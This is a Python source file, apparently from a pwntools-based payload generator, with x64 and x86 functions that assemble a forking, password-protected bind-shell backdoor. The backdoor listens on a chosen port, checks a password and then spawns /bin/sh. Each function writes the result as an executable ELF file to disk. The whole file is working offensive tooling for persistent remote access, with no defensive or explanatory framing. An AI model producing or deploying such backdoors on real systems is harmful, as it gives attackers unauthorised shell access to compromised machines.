from pwn import *
from . import my_package

from colorama import Fore,Back,Style


chars = my_package.chars

def x64_power_bind_shell(shell_path ,listen_port, passwd, filename=None):
	context.arch = 'amd64'
	context.endian = 'little'
	context.bits = '64'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd)
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	#passwd = '0x'+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	passwd = "0x"+enhex(p64(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")
	shellcode = shellcraft.fork()
	shellcode += '''
	cmp rax,0
	jnz main_lab
	'''
	shellcode += '''
	push   0x29
	pop    rax
	push   0x2
	pop    rdi
	push   0x1
	pop    rsi
	xor    rdx,rdx
	syscall
	mov    r15,rax
	'''
	shellcode += shellcraft.setsockopt("rax",1,0xf,"rsp",4)
	shellcode +='''
	push   r15
	pop    rdi
	xor    rdx, rdx
	push   rdx
	push   rdx
	pushw  %s
	pushw  0x2
	push   0x31
	pop    rax
	push   rsp
	pop    rsi
	mov    dl,0x10
	syscall
	push  0x32
	pop    rax
	push   0x2
	pop    rsi
	syscall 
 	push   0x2b
 	pop    rax
	xor    rsi,rsi
	cdq    
	syscall 
	push   rax
	pop    rdi
	push   0x2
	pop    rsi
	push   0x21
	pop    rax
	syscall
	push   rax
	pop    rdi
	push   0x2
	pop    rsi
	push   0x21
	pop    rax
	syscall
	dec    rsi
	jns    $-8
	push   0x1
	pop    rax
	movabs r9,0x203a647773736150
	push   r9
	mov    rsi,rsp
	push   0x8
	pop    rdx
	syscall
	mov    rdx, %s
	xor    rax,rax
	add    rsi,0x8
	syscall 
	movabs rax,%s
	push   rsi
	pop    rdi
	scas   rax,QWORD PTR es:[rdi]
	jne    $+0x1e
	xor    rax,rax
	push   rax
	movabs rbx,0x68732f2f6e69622f
	push   rbx
	push   rsp
	pop    rdi
	push   rax
	push   rsp
	pop    rdx
	push   rdi
	push   rsp
	pop    rsi
	push   0x3b
	pop    rax
	syscall 
	'''
	shellcode += shellcraft.exit(0)
	shellcode += '''
main_lab:
	push 61
	pop rax
	xor rdi,rdi
	syscall
	jmp _start
	'''
	shellcode = asm(shellcode%(listen_port, passwd_len, passwd))
	ELF_data =make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename = context.arch + "-bind_power-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 


def x86_power_bind_shell(shell_path ,listen_port , passwd, filename=None):
	context.arch = 'i386'
	context.endian = 'little'
	context.bits = '32'
	log.success("bind port is set to "+ str(listen_port))
	log.success("passwd is set to '%s'"%passwd )
	listen_port = '0x'+enhex(p16(listen_port))
	passwd_len = hex(len(passwd))
	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).rjust(16,"0")


	shellcode = shellcraft.fork()

	shellcode += '''
cmp eax, 0
jne main_lab
	'''
	
	shellcode += '''
push 0x1
pop ebx
xor edx,edx
push edx
push 0x66
pop eax
push ebx
push 0x2
mov ecx,esp
int 0x80
mov ebp, eax
'''
	shellcode += shellcraft.setsockopt("eax",1,0xf,"esp",4)

	shellcode +='''
mov esi,ebp
push 0x66
pop eax
mov ebx,0x2
push dx
push %s
push bx
mov ecx,esp
push 0x10
push ecx
push esi
mov ecx,esp
int 0x80
push 0x66
pop eax
mov bl,4
push 0
push esi
mov ecx,esp
int 0x80
push 0x66
pop eax
inc ebx
push edx
push edx
push esi
mov ecx,esp
int 0x80
mov ebx,eax
xor ecx,ecx
mov cl,2
mov al,0x3f
int 0x80
dec ecx
jns $-5
push 0x003a6477
push 0x73736150
mov  ecx,esp
push 4
pop  eax
push 8
pop  edx
int 0x80
push 3
pop eax
xor ecx,ecx
sub esp,8
mov ecx,esp
push %s
pop edx
int 0x80
mov edi,[esp]
cmp edi,%s
jne $+80
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx, esp
/* push argument array ['sh\x00'] */
/* push 'sh\x00\x00' */
push 0x1010101
xor dword ptr [esp], 0x1016972
xor ecx, ecx
push ecx /* null terminate */
push 4
pop ecx
add ecx, esp
push ecx /* 'sh\x00' */
mov ecx, esp
xor edx, edx
/* call execve() */
push SYS_execve /* 0xb */
pop eax
int 0x80
	'''
	shellcode = shellcode%(listen_port, passwd_len, passwd)

	shellcode += shellcraft.exit(0)

	shellcode += '''
main_lab:
	'''

	shellcode += shellcraft.wait4(0,0,0,0)

	shellcode += '''
jmp _start
	'''
	shellcode = asm(shellcode)
	ELF_data = make_elf(shellcode)
	if(filename==None):
		log.info("waiting 3s")
		sleep(1)
		filename=context.arch + "-bind_power-" + my_package.random_string_generator(4,chars)
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		os.chmod(filename, 0o755)
		log.success("{} is ok in current path ./".format(filename))
		context.arch = 'i386'
		context.bits = "32"
		context.endian = "little"
	else:
		if(os.path.exists(filename) != True):
			log.info("waiting 3s")
			sleep(1)
			f=open(filename,"wb")
			f.write(ELF_data)
			f.close()
			os.chmod(filename, 0o755)
			log.success("{} generated successfully".format(filename))
			context.arch='i386'
			context.bits="32"
			context.endian="little"
		else:
			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) "+Fore.RESET,end='')
			choise = input()
			if choise == "y\n" or choise == "\n":
				log.info("waiting 3s")
				sleep(1)
				f=open(filename,"wb")
				f.write(ELF_data)
				f.close()
				os.chmod(filename, 0o755)
				log.success("{} generated successfully".format(filename))
				context.arch='i386'
				context.bits="32"
				context.endian="little"
			else:
				return 



